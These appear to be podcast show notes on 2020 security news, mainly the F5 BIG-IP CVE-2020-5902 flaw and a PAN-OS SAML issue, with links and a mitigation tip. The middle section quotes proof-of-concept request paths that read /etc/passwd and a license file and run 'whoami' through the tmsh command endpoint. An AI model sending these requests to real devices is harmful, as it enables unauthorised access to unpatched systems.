---
title: "2020-026- WISP PSA PAN-OS vuln redux F5 has a bad weekend vuln scoring Twitter advice and more"
date: Wed, 08 Jul 2020 06:04:49 +0000
draft: false
type: posts
---
# 2020-026- WISP PSA PAN-OS vuln redux F5 has a bad weekend vuln scoring Twitter advice and more

<br/>

<br/>
1st: WISP.org PSA from Rachel Tobac (@racheltobac) & @wisporg talking about #shareTheMicInCyber

#SAML PAN-OS: [https://twitter.com/RyanLNewington/status/1278074919092289537](https://twitter.com/RyanLNewington/status/1278074919092289537)

 F5 vulnerability:

[https://www.wired.com/story/f5-big-ip-networking-vulnerability/](https://www.wired.com/story/f5-big-ip-networking-vulnerability/)

[https://research.nccgroup.com/2020/07/05/rift-f5-networks-k52145254-tmui-rce-vulnerability-cve-2020-5902-intelligence/](https://research.nccgroup.com/2020/07/05/rift-f5-networks-k52145254-tmui-rce-vulnerability-cve-2020-5902-intelligence/)

F5 Mitigation (if patching is not immediately possible): [https://twitter.com/TeamAresSec/status/1280590730684256258](https://twitter.com/TeamAresSec/status/1280590730684256258)

**Redirect 404 /**

[https://twitter.com/wugeej/status/1280008779359125504](https://twitter.com/wugeej/status/1280008779359125504) \- Tweet with PoC for the LFI and RCE

F5 Big-IP CVE-2020-5902 LFI and RCE

LFI

https:///tmui/login.jsp/..;/tmui/locallb/workspace/fileRead.jsp?fileName=/etc/passwd

or /etc/hosts

or /config/bigip.license

RCE

https:///tmui/login.jsp/..;/tmui/locallb/workspace/tmshCmd.jsp?command=whoami

How to cope in a no-win situation:  
  
[https://twitter.com/datSecuritychic/status/1280527467569008640](https://twitter.com/datSecuritychic/status/1280527467569008640)

![F5 PoC vuln tweet](https://assets.libsyn.com/secure/show/50535/f5_vuln-tweet.png)

Semicolon in bash: [https://docstore.mik.ua/orelly/unix3/upt/ch28\_16.htm#:~:text=When%20the%20shell%20sees%20a,once%20at%20a%20single%20prompt.](https://docstore.mik.ua/orelly/unix3/upt/ch28_16.htm#:~:text=When%20the%20shell%20sees%20a,once%20at%20a%20single%20prompt.)

#### [Source](http://brakeingsecurity.com/2020-026-wisp-psa-pan-os-vuln-redux-f5-has-a-bad-weekend-vuln-scoring-twitter-advice-and-more)

<br/>
---
